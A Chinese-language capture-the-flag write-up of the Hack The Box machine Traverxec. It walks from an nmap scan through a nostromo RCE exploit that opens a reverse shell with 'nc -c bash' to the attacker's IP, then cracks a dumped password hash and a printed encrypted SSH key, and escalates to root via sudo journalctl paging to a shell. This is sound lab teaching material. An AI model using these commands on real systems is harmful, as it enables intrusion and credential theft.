# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务发现
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# nmap -sV -Pn 10.10.10.165              
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 10:01 EST
Nmap scan report for 10.10.10.165
Host is up (0.63s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.28 seconds

```

看到网络服务器是nostromo，搜索这个服务器的漏洞情况
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# searchsploit nostromo 1.9.6                                                                                                                                                                                                                        130 ⨯
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                                                                                                                                                                     | multiple/remote/47837.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

存在一个RCE

尝试执行：
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# python 47837.py 10.10.10.165 80 id                                                                                       


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Mon, 27 Dec 2021 15:20:04 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

成功执行```id```命令，证实rce存在

我们执行以下payload

> python 47837.py 10.10.10.165 80 'nc -c bash 10.10.14.3 4242'


成功拿到立足点：
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.165] 46046
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


在 ```/var/nostromo/conf/.htpasswd```找到一个用户凭证
```
www-data@traverxec:/tmp$ cat /var/nostromo/conf/.htpasswd
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

```

保存到本地用john破解
```
hn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:01:04 DONE (2021-12-27 11:11) 0.01548g/s 163775p/s 163775c/s 163775C/s Noyoudo..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

可是用这个密码不能切换到david，也不能ssh登录。

这里我卡了非常久，一直不能提权到david，上HTB论坛看别人的hint，提到需要认真查看服务文档和config文件


查看```/var/nostromo/conf/nhttpd.conf```文件

```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www


```

注意这个服务的admin是```david@traverxec.htb```，另外留意这两段
```
homedirs                /home
homedirs_public         public_www
```

使用```man nhttpd```命令，留意这段
```
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:

           http://www.nazgul.ch/~hacki/

     The content of the home directory is handled exactly the same way as a
     directory in your document root.  If some users don't want that their
     home directory can be accessed via HTTP, they shall remove the world
     readable flag on their home directory and a caller will receive a 403
     Forbidden response.  Also, if basic authentication is enabled, a user can
     create an .htaccess file in his home directory and a caller will need to
     authenticate.

     You can restrict the access within the home directories to a single sub
     directory by defining it via the homedirs_public option.
```

在网页上使用```~[用户名]```可以访问用户的home目录

这个靶机是```http://10.10.10.165/~david```

文档同时说明，如果不想别人通过http访问到自己的home目录，可以指定```public_www```替代

也就是说上面网页其实访问的就是david下的```public_www```目录

我们查看```public_www```内容

```
www-data@traverxec:/var/nostromo/conf$ ls -alh /home/david/public_www
ls -alh /home/david/public_www
total 16K
drwxr-xr-x 3 david david 4.0K Oct 25  2019 .
drwx--x--x 5 david david 4.0K Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4.0K Oct 25  2019 protected-file-area

```

在```protected-file-area```下找到david的ssh秘钥
```
┌──(root💀kali)-[~/Downloads/home/david/.ssh]
└─# cat id_rsa                                                           
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----

```


john破解
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
                                                                                            
┌──(root💀kali)-[~/htb/Traverxec]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2021-12-28 06:02) 0.1321g/s 1894Kp/s 1894Kc/s 1894KC/sa6_123..*7¡Vamos!
Session completed

```

登录到```david```账号
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# ssh -i id_rsa david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
RSA key fingerprint is SHA256:GlGTwru98ALf7QPJpV8VHV6L2FOwREy6tz2O2W/9JM0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (RSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```

# 提权

```/home/david/bin```目录下有两个文件
```
david@traverxec:~/bin$ ls -alh
total 16K
drwx------ 2 david david 4.0K Oct 25  2019 .
drwx--x--x 5 david david 4.0K Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh

```

查看```server-stats.sh ```内容
```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 

```

留意最后一行```/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat ```,这里用了一个sudo特权命令

我们尝试手动执行这一条命令,并没有要求我们输入登录密码
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Tue 2021-12-28 07:49:41 EST, end at Tue 2021-12-28 08:22:51 EST. --
Dec 28 07:49:43 traverxec systemd[1]: Starting nostromo nhttpd server...
Dec 28 07:49:43 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory
Dec 28 07:49:43 traverxec nhttpd[419]: started
Dec 28 07:49:43 traverxec nhttpd[419]: max. file descriptors = 1040 (cur) / 1040 (max)
Dec 28 07:49:43 traverxec systemd[1]: Started nostromo nhttpd server.

```

也就是说这是一条用户```david```的特权命令，相当于```sudo -l```显示的内容

因此我们使用以下方法提权
先执行：
```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```
再执行：
```
!/bin/sh
```

成功提权到root

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2021-12-28 07:49:41 EST, end at Tue 2021-12-28 08:19:44 EST. --
Dec 28 07:49:43 traverxec systemd[1]: Starting nostromo nhttpd server...
Dec 28 07:49:43 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start:
Dec 28 07:49:43 traverxec nhttpd[419]: started
Dec 28 07:49:43 traverxec nhttpd[419]: max. file descriptors = 1040 (cur) / 1040 (max)
Dec 28 07:49:43 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
9aa36a6d76....
# 

```

# 总结
立足点和root提权都非常简单。用户提权是最难的部分，唯有理解靶机的服务才能知道突破点在哪里。